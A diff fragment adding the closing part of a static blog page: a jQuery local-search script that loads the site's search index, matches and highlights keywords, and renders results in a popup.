+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
